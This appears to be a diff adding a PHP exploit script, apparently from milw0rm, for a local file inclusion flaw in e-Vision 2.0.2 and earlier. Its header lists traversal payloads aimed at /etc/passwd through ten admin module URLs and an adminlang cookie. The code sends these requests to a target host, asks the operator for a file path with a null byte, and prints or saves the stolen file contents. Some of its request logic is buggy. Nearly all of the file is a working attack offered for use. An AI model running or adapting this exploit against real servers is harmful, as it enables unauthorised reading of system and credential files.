@@ -1,0 +1,231 @@
+<?php
+
+error_reporting(0);
+ini_set("default_socket_timeout",5);
+
+
+
+
+/*
+    e-Vision <= 2.0.2 Multiple Local File Inclusion Exploit
+    -------------------------------------------------------
+    by athos - download http://sourceforge.net 
+    -------------------------------------------------------
+    Works with magic quotes gpc turned off
+    
+    
+    javascript: document.cookie="adminlang=../../../../etc/passwd";
+    modules/3rdparty/adminpart/add3rdparty.php?module=../../../../../../etc/passwd
+    modules/polling/adminpart/addpolling.php?module=../../../../../etc/passwd
+    modules/contact/adminpart/addcontact.php?module=../../../../etc/passwd
+    modules/brandnews/adminpart/addbrandnews.php?module=../../../etc/passwd
+    modules/newsletter/adminpart/addnewsletter.php?module=../../../../etc/passwd
+    modules/game/adminpart/addgame.php?module=../../../../etc/passwd
+    modules/tour/adminpart/addtour.php?module=../../../etc/passwd
+    modules/articles/adminpart/addarticles.php?module=../../../../etc/passwd
+    modules/product/adminpart/addproduct.php?module=../../../../etc/passwd
+    modules/plain/adminpart/addplain.php?module=../../../../../etc/passwd
+
+    ../../etc/passwd and nullbyte
+    
+    how to fix? addslashes($_GET['module']); so you remove the nullbyte...isn't a good fix
+    
+    
+    coded by me
+    
+    
+*/    
+
+$exploit = new Exploit;
+$domain = $argv[1];
+$mymode = $argv[2];
+
+$exploit->starting();
+$exploit->is_vulnerable($domain);
+$exploit->exploiting($domain,$mymode);
+
+ 
+
+class Exploit
+{
+  function http_request($host,$data) 
+  {   
+   
+    if(!$socket = socket_create(AF_INET,SOCK_STREAM,SOL_TCP)) 
+    {
+       echo "socket_create() error!\r\n";
+       exit;
+    }
+    if(!socket_set_option($socket,SOL_SOCKET,SO_BROADCAST,1))
+    { 
+      echo "socket_set_option() error!\r\n";
+      exit;
+    }
+    
+    if(!socket_connect($socket,$host,80))
+    {
+      echo "socket_connect() error!\r\n";
+      exit;
+    }
+    if(!socket_write($socket,$data,strlen($data)))
+    {
+      echo "socket_write() errror!\r\n";
+      exit;
+    }
+  
+    while($get = socket_read($socket,1024,PHP_NORMAL_READ)) 
+    { 
+      $content .= $get; 
+    }
+
+    socket_close($socket);
+  
+    $array = array(
+                 'HTTP/1.1 404 Not Found',
+                 'HTTP/1.1 300 Multiple Choices',
+                 'HTTP/1.1 301 Moved Permanently',
+                 'HTTP/1.1 302 Found',
+                 'HTTP/1.1 304 Not Modified',
+                 'HTTP/1.1 400 Bad Request',
+                 'HTTP/1.1 401 Unauthorized',
+                 'HTTP/1.1 402 Payment Required',
+                 'HTTP/1.1 403 Forbidden',
+                 'HTTP/1.1 405 Method Not Allowed',
+                 'HTTP/1.1 406 Not Acceptable',
+                 'HTTP/1.1 407 Proxy Authentication Required',
+                 'HTTP/1.1 408 Request Timeout',
+                 'HTTP/1.1 409 Conflict',
+                 'HTTP/1.1 410 Gone',
+                 'HTTP/1.1 411 Length Required',
+                 'HTTP/1.1 412 Precondition Failed',
+                 'HTTP/1.1 413 Request Entity Too Large',
+                 'HTTP/1.1 414 Request-URI Too Long',
+                 'HTTP/1.1 415 Unsupported Media Type',
+                 'HTTP/1.1 416 Request Range Not Satisfiable',
+                 'HTTP/1.1 417 Expectation Failed',
+                 'HTTP/1.1 Retry With',
+                );
+               
+    for($i=0;$i<=count($array);$i++)
+   
+    if(eregi($array[$i],$content)) 
+    {
+      return ("$array[$i]\r\n");
+      break;
+    } 
+    else 
+    {
+      return ("$content\r\n");
+      break;
+    }
+  }
+  
+  function is_vulnerable($host)
+  {
+    $host = explode('/',$host);
+    
+    $header .= "GET /$host[1]/modules/3rdparty/adminpart/add3rdparty.php?module=%27 HTTP/1.1\r\n";
+    $header .= "Host: $host[0]\r\n";
+    $header .= "User-Agent: athos~doesntexist\r\n";
+    $header .= "Connection: close\r\n\r\n";
+    
+    if(stristr($this->http_request($host[0],$header),"\\'"))
+    {  
+      echo "[+] Magic Quotes GPC On!\n";
+      echo "[+] Exploit Failed!\n";
+      exit;
+    }
+    else
+    {
+      return false;
+    }
+  }
+  
+  function starting()
+  {
+    global $argv;
+    
+    if(preg_match('/http://(.+?)$/',$argv[1]) or empty($argv[1]))
+    {
+      echo "[+] e-Vision <= 2.0.2 Multiple Local File Inclusion Exploit\r\n";
+      echo "[+] by athos\r\n";
+      echo "    -----------------------------------------------------------\r\n";
+      echo "[+] Usage: php $argv[0] [host/path] [mode]\r\n";
+      echo "[+] Usage: php $argv[0] [host/path] [save]\r\n";
+      echo "[+] Usage: php $argv[0] [host/path]        \r\n";
+      exit;
+    }
+  }
+  
+  function exploiting($host,$mode)
+  {
+    $host = explode('/',$host);
+    $i = 0;
+    
+    
+    echo "[+] Local File (ex: ../../etc/passwd%00)\r\n";
+    echo "[+] Local File: ";
+    $file = stripslashes(trim(fgets(STDIN)));
+    
+    if(empty($file)) die("you fail");
+    
+    $array = array (
+                    "3rdparty/adminpart/add3rdparty.php?module=$file",
+                    "polling/adminpart/addpolling.php?module=$file",
+                    "contact/adminpart/addcontact.php?module=$file",
+                    "brandnews/adminpart/addbrandnews.php?module=$file",
+                    "newsletter/adminpart/addnewsletter.php?module=$file",
+                    "game/adminpart/addgame.php?module=$file",
+                    "tour/adminpart/addtour.php?module=$file",
+                    "articles/adminpart/addarticles.php?module=$file",
+                    "product/adminpart/addproduct.php?module=$file",
+                    "plain/adminpart/addplain.php?module=$file",
+                  ); 
+                  
+    if($i > 9)
+    {
+      $write .= "GET /$host[1]/admin/ind_ex.php HTTP/1.1\r\n";
+      $write .= "Host: $host[0]\r\n";
+      $write .= "User-Agent: doesntexist\r\n";
+      $write .= "Cookie: adminlang=$file; path=/admin\r\n";
+      $write .= "Connection: close\r\n\r\n";
+    }
+    else
+    {
+
+      $write .= "GET /$host[1]/modules/$array[$i] HTTP/1.1\r\n";
+      $write .= "Host: $host[0]\r\n";
+      $write .= "User-Agent: you are lost\r\n";
+      $write .= "Connection: close\r\n\r\n";
+    }
+    
+    if(stristr($this->http_request($host[0],$write),'No such file or directory in'))
+    {
+      $i++;
+    }
+    else
+    {
+      if($mode == "save") 
+      {
+        $rand = rand(0,99999);
+        fclose(fwrite(fopen(getcwd().'/'.$rand.'.txt',"a+"),$this->http_request($host[0],$write)));
+        
+        echo "[+] File $rand Saved Successfully!\r\n";
+        echo "[+] Exploit Terminated!\r\n";
+        exit;
+      }
+      else
+      {
+        echo $this->http_request($host[0],$write);
+        exit;
+      }
+    }
+  }
+}
+  
+  
+// StAkeR - StAkeR[at]hotmail[dot]it
+// Note: if you add on msn i don't accept!       
+// Greetz "er biondo"
+
+# milw0rm.com [2008-11-07]
